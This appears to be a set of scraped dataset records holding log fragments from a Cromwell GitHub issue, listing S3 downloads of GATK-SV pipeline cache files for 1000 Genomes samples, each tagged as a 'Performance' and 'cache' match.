s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-13/cacheCopy/SR00c.HG00457.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:56188,cache,cacheCopy,56188,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz.tbi; 1608597391284,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-156/cacheCopy/SR00c.NA21133.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-156/cacheCopy/SR00c.NA21133.txt.gz; 1608597393258,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-27/cacheCopy/SR00c.HG01384.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-27/cacheCopy/SR00c.HG01384.txt.gz.tbi; 1608597394986,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-68/cacheCopy/SR00c.HG02648.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:123496,cache,cacheCopy,123496,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-138/cacheCopy/SR00c.NA19795.txt.gz.tbi; 1608597455771,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-112/cacheCopy/SR00c.NA18539.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-112/cacheCopy/SR00c.NA18539.txt.gz; 1608597458007,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-3/cacheCopy/SR00c.HG00140.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-3/cacheCopy/SR00c.HG00140.txt.gz.tbi; 1608597459482,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-67/cacheCopy/SR00c.HG02642.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:142223,cache,cacheCopy,142223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-139/cacheCopy/SR00c.NA19818.txt.gz.tbi; 1608597428681,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-100/cacheCopy/SR00c.HG04158.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-100/cacheCopy/SR00c.HG04158.txt.gz; 1608597430528,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-30/cacheCopy/SR00c.HG01474.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-30/cacheCopy/SR00c.HG01474.txt.gz.tbi; 1608597432512,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-98/cacheCopy/SR00c.HG03888.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4ea",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:134115,cache,cacheCopy,134115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-141/cacheCopy/SR00c.NA20126.txt.gz.tbi; 1608597252335,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-132/cacheCopy/SR00c.NA19449.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-132/cacheCopy/SR00c.NA19449.txt.gz; 1608597255692,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz; 1608597256940,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-114/cacheCopy/SR00c.NA18553.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:86086,cache,cacheCopy,86086,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-148/cacheCopy/SR00c.NA20752.txt.gz.tbi; 1608597438407,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-115/cacheCopy/SR00c.NA18560.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-115/cacheCopy/SR00c.NA18560.txt.gz; 1608597439856,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-32/cacheCopy/SR00c.HG01572.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-32/cacheCopy/SR00c.HG01572.txt.gz.tbi; 1608597442529,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-54/cacheCopy/SR00c.HG02272.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4ea",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:137238,cache,cacheCopy,137238,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-25/cacheCopy/SR00c.HG01344.txt.gz.tbi; 1608597355348,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-102/cacheCopy/SR00c.HG04183.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-102/cacheCopy/SR00c.HG04183.txt.gz; 1608597359185,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-155/cacheCopy/SR00c.NA21122.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-155/cacheCopy/SR00c.NA21122.txt.gz; 1608597361344,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-33/cacheCopy/SR00c.HG01607.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:113507,cache,cacheCopy,113507,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-34/cacheCopy/SR00c.HG01709.txt.gz; 1608596960348,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz.tbi; 1608596962113,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-2/cacheCopy/SR00c.HG00129.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-2/cacheCopy/SR00c.HG00129.txt.gz.tbi; 1608596964153,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:6295,cache,cacheCopy,6295,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-39/cacheCopy/SR00c.HG01861.txt.gz.tbi; 1608597639911,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-111/cacheCopy/SR00c.NA18530.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-111/cacheCopy/SR00c.NA18530.txt.gz; 1608597642095,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-137/cacheCopy/SR00c.NA19746.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-137/cacheCopy/SR00c.NA19746.txt.gz.tbi; 1608597643768,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-91/cacheCopy/SR00c.HG03727.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:194175,cache,cacheCopy,194175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-4/cacheCopy/SR00c.HG00150.txt.gz; 1608597448688,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-17/cacheCopy/SR00c.HG00701.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-17/cacheCopy/SR00c.HG00701.txt.gz.tbi; 1608597451192,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-96/cacheCopy/SR00c.HG03864.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-96/cacheCopy/SR00c.HG03864.txt.gz; 1608597453442,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-138/cacheCopy/SR00c.NA19795.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:140355,cache,cacheCopy,140355,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz.tbi; 1608597632017,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz; 1608597635134,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-103/cacheCopy/SR00c.NA06984.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-103/cacheCopy/SR00c.NA06984.txt.gz; 1608597637215,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-39/cacheCopy/SR00c.HG01861.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:192306,cache,cacheCopy,192306,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-48/cacheCopy/SR00c.HG02020.txt.gz.tbi; 1608597409505,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-151/cacheCopy/SR00c.NA20845.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-151/cacheCopy/SR00c.NA20845.txt.gz; 1608597411470,download: 